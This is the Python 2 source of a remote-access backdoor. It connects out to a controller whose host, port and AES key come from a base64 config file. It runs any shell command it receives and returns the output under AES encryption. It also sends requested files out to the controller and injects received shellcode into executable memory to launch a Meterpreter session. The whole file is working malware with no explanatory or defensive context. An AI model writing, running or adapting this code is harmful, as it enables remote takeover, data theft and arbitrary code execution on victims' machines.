#!/usr/bin/python

import socket, subprocess, sys, os
import pickle
from Crypto.Cipher import AES
import base64
import ctypes
import pdb
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
BLOCK_SIZE = 32  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

# READ CONFIG IN BASE 64
file = open("./config", "r")
config = file.read()
config = base64.b64decode(config)
config = config.split(",")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


s.connect((config[0], int(config[1])))




def do_encrypt(message):
    #obj = AES.new('This is a key123', AES.MODE_ECB)
    #ciphertext = obj.encrypt(message)
    raw = pad(message)
    obj = AES.new(config[2], AES.MODE_ECB)
    ciphertext = obj.encrypt(raw)
    return ciphertext

def open_meterpreter(shellcode):
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0),
                                             ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


while True :
    command = s.recv(1024)
    print command
    if command == 'quit' :
        break
    if "download" in command:
        isFirst = False
        a = command.replace("download", "")
        a = a.replace(" ", "")
        f = open(a, 'rb')
        l = f.read(35000)
        s.send(l)
        f.close()
    elif "hack" in command:
        buf = s.recv(1024)
        open_meterpreter(bytearray(buf))
        print "sigue"
    else:
        reply = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = reply.communicate()
        en_reply = do_encrypt(stdout)
        s.send(en_reply)

s.close()
